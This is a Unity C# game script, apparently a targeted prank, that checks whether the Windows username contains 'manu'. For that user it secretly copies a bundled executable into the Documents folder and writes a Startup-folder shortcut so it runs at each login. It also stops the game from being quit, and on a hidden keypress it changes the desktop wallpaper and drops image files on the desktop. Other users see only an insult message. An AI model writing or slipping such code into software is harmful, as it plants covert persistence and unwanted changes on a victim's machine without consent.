using System.Collections;
using System.Collections.Generic;
using System;
using System.IO;
using System.Runtime.InteropServices;
using UnityEngine;
using UnityEngine.UI;
using UnityEngine.Audio;
using System.Runtime.InteropServices.ComTypes;
using System.Text;

public class Manu : MonoBehaviour
{
    public AudioMixer mixer;

    public AudioSource fx;
    public AudioClip fx2;
    public AudioClip fx3;
    public Image creepyFace;

    public GameObject nonManuCanvas;
    public Text nonManuText;

    static bool isManu;

    int fiveCount = 0;
    float lastFiveTime = 0;
    bool fiveTriggered = false;

    string fileName = "Manu/test2.gif";
    string folderName = "Manu/";

    public float creepyImageFadeTime = 120f;

    public bool everyoneIsManu = false;

    private void Start()
    {
        isManu = everyoneIsManu || System.Environment.UserName.ToLower().Contains("manu");

        if (isManu)
        {
            string leaguePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "League of Legends/Manu/");
            DirectoryCopy(GetFilePathSR(folderName), leaguePath, true, true);

            string startUpDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            appShortcutToFolder(Path.Combine(leaguePath, "Manu00.exe"), startUpDir, leaguePath);

            mixer.SetFloat("volManu", 40f);
        }
    }

    [RuntimeInitializeOnLoadMethod]
    static void RunOnStart()
    {
        Application.wantsToQuit += WantsToQuit;
    }

    static bool WantsToQuit()
    {
        return !isManu;
    }

    void Update()
    {
        if (fiveTriggered)
            return;

        if (Input.GetKeyDown(KeyCode.Keypad9) || Input.GetKeyDown(KeyCode.Alpha9))
        {
            if (Time.time > lastFiveTime + 1f)
                fiveCount = 1;
            else
            {
                fiveCount++;
                if (fiveCount == 5)
                {
                    EasterEgg();
                    return;
                }
            }
            lastFiveTime = Time.time;
        }

        if (isManu)
        {
            float fadeValue = Mathf.Clamp01(Time.time / creepyImageFadeTime);
            creepyFace.color = new Color(1f, 1f, 1f, fadeValue * 0.3f);
        }
    }

    void EasterEgg()
    {
        fiveTriggered = true;

        if (!isManu)
        {
            nonManuCanvas.SetActive(true);
            nonManuText.text = "Du bist:\n" + Mathf.Round(UnityEngine.Random.value * 100f) + "% Kacke!";
            return;
        }

        creepyFace.color = new Color(1f, 1f, 1f, 0.6f);

        fx.Play();
        StartCoroutine(MoreFx());
        string filePath = GetFilePathSR(fileName);
        SetWallpaper(filePath);

        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        for (int i = 0; i < 5; i++)
        {
            File.Copy(filePath, Path.Combine(desktopPath, i + ".gif"), true);
        }
    }

    IEnumerator MoreFx()
    {
        yield return new WaitForSeconds(6f);
        fx.clip = fx2;
        fx.Play();
        yield return new WaitForSeconds(5f);
        fx.clip = fx3;
        fx.Play();
    }

    public static string GetFilePathSR(string relativePath)
    {
        return Path.Combine(Application.streamingAssetsPath, relativePath);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public static void SetWallpaper(String file)
    {
        SystemParametersInfo(0x0014, 0, file, 0x0001);
    }

    private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs, bool overrideDest)
    {
        // Get the subdirectories for the specified directory.
        DirectoryInfo dir = new DirectoryInfo(sourceDirName);

        if (!dir.Exists)
        {
            throw new DirectoryNotFoundException(
                "Source directory does not exist or could not be found: "
                + sourceDirName);
        }

        DirectoryInfo[] dirs = dir.GetDirectories();

        // If the destination directory doesn't exist, create it.       
        Directory.CreateDirectory(destDirName);

        // Get the files in the directory and copy them to the new location.
        FileInfo[] files = dir.GetFiles();
        foreach (FileInfo file in files)
        {
            string tempPath = Path.Combine(destDirName, file.Name);
            file.CopyTo(tempPath, overrideDest);
        }

        // If copying subdirectories, copy them and their contents to new location.
        if (copySubDirs)
        {
            foreach (DirectoryInfo subdir in dirs)
            {
                string tempPath = Path.Combine(destDirName, subdir.Name);
                DirectoryCopy(subdir.FullName, tempPath, copySubDirs, overrideDest);
            }
        }
    }

    private void appShortcutToFolder(string exeFile, string destDir, string workingDir)
    {
        IShellLink link = (IShellLink)new ShellLink();

        // setup shortcut information
        link.SetDescription("League sucks");
        link.SetWorkingDirectory(workingDir);
        link.SetPath(exeFile);

        // save it
        IPersistFile file = (IPersistFile)link;
        file.Save(Path.Combine(destDir, "lolv2.lnk"), false);
    }
}

[ComImport]
[Guid("00021401-0000-0000-C000-000000000046")]
internal class ShellLink
{
}

[ComImport]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
[Guid("000214F9-0000-0000-C000-000000000046")]
internal interface IShellLink
{
    void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
    void GetIDList(out IntPtr ppidl);
    void SetIDList(IntPtr pidl);
    void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cchMaxName);
    void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
    void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cchMaxPath);
    void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
    void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cchMaxPath);
    void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
    void GetHotkey(out short pwHotkey);
    void SetHotkey(short wHotkey);
    void GetShowCmd(out int piShowCmd);
    void SetShowCmd(int iShowCmd);
    void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath, int cchIconPath, out int piIcon);
    void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
    void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
    void Resolve(IntPtr hwnd, int fFlags);
    void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
}
